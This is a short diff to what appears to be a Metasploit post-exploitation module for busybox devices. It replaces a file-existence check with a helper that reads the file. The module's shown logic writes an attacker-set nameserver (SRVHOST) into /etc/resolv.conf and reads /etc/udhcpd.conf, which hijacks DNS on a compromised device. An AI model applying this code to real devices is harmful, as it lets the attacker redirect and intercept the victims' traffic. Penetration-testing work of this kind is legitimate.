@@ -40,14 +40,14 @@ class Metasploit3 < Msf::Post
   
     workdone = false
     vprint_status("Searching for files to modify dns server.")
-    if file?("/etc/resolv.conf")
+    if file_exists("/etc/resolv.conf")
       vprint_status("Resolv.conf found.")
       if is_writable_and_write("/etc/resolv.conf", "nameserver #{datastore['SRVHOST']}", false)
         print_good("Dns server added to resolv.conf.")
         workdone = true
       end
     end
-    if file?("/etc/udhcpd.conf")
+    if file_exists("/etc/udhcpd.conf")
       vprint_status("Udhcpd.conf found.")
       original_content = read_file("/etc/udhcpd.conf")
       vprint_status("Original udhcpd.conf content:")
@@ -110,6 +110,15 @@ class Metasploit3 < Msf::Post
     else
       return false
     end
+  end
+
+  #file? doesnt work because test -f is not implemented in busybox
+  def file_exists(file_path)
+    s = read_file(file_path)
+    if s and s.length
+      return true
+    end
+    return false
   end
 
 end
